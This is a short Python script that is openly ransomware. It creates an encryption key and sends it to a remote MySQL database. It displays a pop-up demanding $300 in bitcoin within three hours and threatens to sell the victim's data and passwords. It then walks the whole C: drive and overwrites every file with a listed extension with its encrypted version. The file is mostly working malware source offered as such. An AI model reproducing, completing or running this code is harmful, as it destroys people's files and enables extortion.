import mysql.connector
from os import walk
from os import path
from cryptography.fernet import Fernet
from Extensions import get_extensions
from win32ui import *
from win32con import *

# Creating encryption key
key = Fernet.generate_key()
f = Fernet(key)

# Database connection
conn = mysql.connector.connect(
    host = "*****",
    user = "*****",
    password = "*****",
    database = "*****",
)
c = conn.cursor()

# Sending key to database
c.execute("INSERT INTO decryption_keys (keys) VALUES ('%s')" % (key,))
conn.commit()

# Get base file name
name = path.basename(__file__)

# Warning message
MessageBox(
    "All of your important files have been encrypted\n",
    "you have 3 hours to send 300$ in bitcoins to this address -> cooladdress.org.\n",
    "If you will not, all of your important data will be sold, all of your password, wil be sold\n",
    "Good luck.",
    MB_ICONWARNING
)

# Extensions to encrypt
extensions = get_extensions()

# Scanning entire C drive
for root, dirs, files in walk("C:\\"):
    # Grabbing files
    for file in files:
        fpath  = root + "\\" + file
        ext = path.splitext(root + "\\" + file)[1]

        # Encrypting only files with specific extension
        if ext in extensions:
            with open(fpath, "rb") as of:
                original: bytes = of.read()

            encrypted = f.encrypt(original)

            with open(fpath, "wb") as of:
                of.write(encrypted)